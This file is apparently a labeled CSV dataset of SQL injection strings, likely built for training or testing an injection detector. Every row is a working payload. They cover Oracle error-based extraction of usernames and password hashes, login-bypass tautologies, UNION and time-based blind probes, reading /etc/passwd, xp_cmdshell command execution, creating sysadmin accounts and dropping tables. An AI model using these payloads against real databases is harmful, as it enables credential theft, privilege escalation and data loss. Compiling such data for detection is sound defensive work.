text,label
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )",1
||6,1
'||'6,1
( ||6 ),1
' or 1 = 1--,1
or 1 = 1,1
' or '1' = '1,1
; or '1' = '1',1
""" or isNULL ( 1/0 )  /*",1
' or '7659' = '7659,1
""" or isNULL ( 1/0 )  /*",1
' -- ,1
' or 1 = 1--,1
""" or 1 = 1--",1
' or 1 = 1 /*,1
or 1 = 1--,1
' or 'a' = 'a,1
""" or ""a"" = ""a",1
' )  or  ( 'a' = 'a,1
admin' or ',1
' select * from information_schema.tables--,1
 )  union select * from information_schema.tables;,1
' having 1 = 1--,1
' having 1 = 1--,1
' group by userid having 1 = 1--,1
' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1
' or 1 in  ( select @@version ) --,1
' union all select @@version--,1
' or 'unusual'  =  'unusual',1
' or 'something'  =  'some'+'thing',1
' or 'text'  =  n'text',1
' or 'something' like 'some%',1
' or 2 > 1,1
' or 'text' > 't',1
' or 'whatever' in  ( 'whatever' ) ,1
' or 2 between 1 and 3,1
' or username like char ( 37 ) ;,1
"' union select * from users where login  =  char ( 114,111,111,116 ) ;",1
' union select ,1
password:*/ = 1--,1
uni/**/on sel/**/ect,1
'; execute immediate 'sel' || 'ect us' || 'er',1
'; exec  ( 'sel' + 'ect us' + 'er' ) ,1
'/**/or/**/1/**/ = /**/1,1
' or 1/*,1
or isNULL ( 1/0 )  /*,1
' or '7659' = '7659,1
""" or isNULL ( 1/0 )  /*",1
' -- &password = ,1
'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login >,1
@var select @var as var into temp end --,1
' and 1 in  ( select var from temp ) --,1
"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1
"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",1
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
create user name identified by 'pass123',1
create user name identified by pass123 temporary tablespace temp default tablespace users;,1
' ; drop table temp --,1
"exec sp_addlogin 'name' , 'password'",1
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )",1
grant connect to name; grant resource to name;,1
"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 )",1
' or 1 = 1 --,1
' union  ( select @@version )  --,1
"' union  ( select NULL,  ( select @@version  )  )   --",1
"' union  ( select NULL, NULL,  ( select @@version  )  )   --",1
"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --",1
"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --",1
"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --",1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --",1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --",1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --",1
"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --",1
'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --,1
'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' --,1
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,1
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --,1
"select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1
"select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1,1
"select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1
select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1
"select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1
"select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \.<  = 1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1
select * from users where id = 1   or 1 = 1 -- 1,1
select * from users where id = 1 or \+<\ or 1 = 1 -- 1,1
"select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or \+<\ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1
"select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or $<\ or 1 = 1 -- 1,1
select * from users where id = 1 or $<\. or 1 = 1 -- 1,1
"select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1",1
select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1
"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \<\. or 1 = 1 -- 1,1
"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \<1 or 1 = 1 -- 1,1
"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1
select * from users where id = 1 or \<$ or 1 = 1 -- 1,1
"select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1,1
"select * from users where id = 1 or \<  = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or !<@ or 1 = 1 -- 1,1
"select * from users where id = 1 or !<@ union select 1,version (  )  -- 1",1
"select * from users where id = 1 or @`\` union select 1,version (  )  -- 1",1
"select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1
select * from users where id = 1 + ( \ )  or 1 = 1 -- 1,1
"select * from users where id = 1 + ( \ )  union select null,@@VERSION -- 1",1
"select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1
select * from users where id = 1. or 1 = 1 -- 1,1
"select * from users where id = 1.&&@ union select 1,version (  )  -- 1",1
select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1,1
"select * from users where id = 1 +  ( \. )  union select null,@@VERSION -- 1",1
"select * from users where id = 1.  union select 1,version (  )  -- 1",1
"select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1.  union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1. union select null,version (  )  -- 1",1
"select * from users where id = 1 +\. union select null,@@VERSION -- 1",1
"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1
select * from users where id = 1. <@ or 1 = 1 -- 1,1
select * from users where id = 1.<@. or 1 = 1 -- 1,1
"select * from users where id = 1.<@. union select 1,version (  )  -- 1",1
select * from users where id = 1.*1 or 1 = 1 -- 1,1
"select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1.<1# union select 1,version (  )  -- 1",1
"select * from users where id = 1. <@ union select 1,version (  )  -- 1",1
"select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1.*\ union select null,@@VERSION -- 1",1
select * from users where id = 1.<@$ or 1 = 1 -- 1,1
"select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1
select * from users where id = 1.%@ or 1 = 1 -- 1,1
"select * from users where id = 1.%@ union select 1,version (  )  -- 1",1
"select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1
select * from users where id = 1 +1 or 1 = 1 -- 1,1
select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1
"select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 11<1# union select 1,version (  )  -- 1",1
select * from users where id = 1 +  ( \+ )  or 1 = 1 -- 1,1
"select * from users where id = 1 +  ( \+ )  union select null,@@VERSION -- 1",1
"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1
"select * from users where id = 1 -1<@ union select 1,version (  )  -- 1",1
"select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 +1<@ union select null,version (  )  -- 1",1
select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1
select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1
"select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",1
"select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",1
select * from users where id = 1 + \+%$ or 1 = 1 -- 1,1
"select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1
"select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 union select 1||1,version (  )  -- 1",1
"select * from users where id = 1 union select 1||@,version (  )  -- 1",1
"select * from users where id = 1 union select 1 1$,version (  )  -- 1",1
"select * from users where id = 1 union select 1 $,version (  )  -- 1",1
"select * from users where id = 1 union select 1 1a,version (  )  -- 1",1
"select * from users where id = 1 union select 1<@$,version (  )  -- 1",1
"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 union select .1_,version (  )  -- 1",1
"select * from users where id = 1 union select 1`\`,version (  )  -- 1",1
"select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 union select .1$_,version (  )  -- 1",1
"select * from users where id = 1 union select 1<@,version (  )  -- 1",1
"select * from users where id = 1 union select 1<@.,version (  )  -- 1",1
"select * from users where id = 1 union select 1 $$,version (  )  -- 1",1
"select * from users where id = 1 union select !<1,version (  )  -- 1",1
"select * from users where id = 1 union select +!<1,version (  )  -- 1",1
"select * from users where id = 1 union select +!<@,version (  )  -- 1",1
"select * from users where id = 1 union select !<@,version (  )  -- 1",1
"select * from users where id = 1 union select @||1,version (  )  -- 1",1
"select * from users where id = 1 union select @&&@,version (  )  -- 1",1
"select * from users where id = 1 union select @ 1$,version (  )  -- 1",1
"select * from users where id = 1 union select  @ $,version (  )  -- 1",1
"select * from users where id = 1 union select @ 1a,version (  )  -- 1",1
"select * from users where id = 1 union select @<@$,version (  )  -- 1",1
"select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 union select @ _,version (  )  -- 1",1
"select * from users where id = 1 union select @ $_,version (  )  -- 1",1
"select * from users where id = 1 union select @<@,version (  )  -- 1",1
"select * from users where id = 1 union select @<@.,version (  )  -- 1",1
"select * from users where id = 1 union select @ $$,version (  )  -- 1",1
select * from users where id = 1 +$ . or 1 = 1 -- 1,1
"select * from users where id = 1 +$ . union select null,@@VERSION -- 1",1
select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1
"select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1",1
select * from users where id = 1 +$+ or 1 = 1 -- 1,1
select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1,1
"select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1",1
select * from users where id = 1 +$+. or 1 = 1 -- 1,1
"select * from users where id = 1 +$+. union select null,@@VERSION -- 1",1
"select * from users where id = 1 +$+ union select null,@@VERSION -- 1",1
select * from users where id = 1 + $+%\ or 1 = 1 -- 1,1
select * from users where id = 1 + $+%1 or 1 = 1 -- 1,1
"select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",1
"select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",1
select * from users where id = 1 + $+%$ or 1 = 1 -- 1,1
"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",1
select * from users where id = 1 <@ or 1 = 1 -- 1,1
select * from users where id = 1 % ( \ )  or 1 = 1 -- 1,1
"select * from users where id = 1 * ( \ )  union select null,@@VERSION -- 1",1
select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1,1
"select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
select * from users where id = 1 % ( $ )  or 1 = 1 -- 1,1
select * from users where id = 1 % ( @ )  or 1 = 1 -- 1,1
select * from users where id = 1 <@. or 1 = 1 -- 1,1
select * from users where id = 1 <@.. or 1 = 1 -- 1,1
"select * from users where id = 1<@.. union select 1,version (  )  -- 1",1
"select * from users where id = 1 <@. union select 1,version (  )  -- 1",1
"select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 *\. union select null,@@VERSION -- 1",1
select * from users where id = 1 <@.$ or 1 = 1 -- 1,1
"select * from users where id = 1 <@.$ union select 1,version (  )  -- 1",1
select * from users where id = 1 *1 or 1 = 1 -- 1,1
"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 <1## union select 1,version (  )  -- 1",1
select * from users where id = 1 <@1$ or 1 = 1 -- 1,1
"select * from users where id = 1 <@1$ union select 1,version (  )  -- 1",1
"select * from users where id = 1 *\ union select null,@@VERSION -- 1",1
select * from users where id = 1 <@$ or 1 = 1 -- 1,1
select * from users where id = 1 %$ . or 1 = 1 -- 1,1
"select * from users where id = 1 *$ . union select null,@@VERSION -- 1",1
select * from users where id = 1 %$ 1 or 1 = 1 -- 1,1
"select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",1
select * from users where id = 1 <@$_ or 1 = 1 -- 1,1
"select * from users where id = 1 <@$_ union select 1,version (  )  -- 1",1
select * from users where id = 1 <@<@ or 1 = 1 -- 1,1
select * from users where id = 1 %!<1 or 1 = 1 -- 1,1
"select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1<@<@ union select 1,version (  )  -- 1",1
"select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 <@<@ union select null,version (  )  -- 1",1
select * from users where id = 1 %!<@ or 1 = 1 -- 1,1
"select * from users where id = 1 <@&@ union select 1,version (  )  -- 1",1
"select * from users where id = 1 <@$$ union select 1,version (  )  -- 1",1
select * from users where id = 1 &@ or 1 = 1 -- 1,1
"select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'",1
"select * from users where id = '1' or  ( \ )  = 1 union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' or  ( \. )  = 1 union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1
select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1
"select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' or \.<  = 1 union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",1
select * from users where id = '1'   or 1 = 1 -- 1',1
"select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1
"select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",1
select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',1
"select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'",1
select * from users where id = '1' or $<\ or 1 = 1 -- 1',1
"select * from users where id = '1' or $<\. union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' or $<\ union select 1,@@VERSION -- 1'",1
"select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'",1
select * from users where id = '1' or \<\. or 1 = 1 -- 1',1
"select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'",1
select * from users where id = '1' or \<1 or 1 = 1 -- 1',1
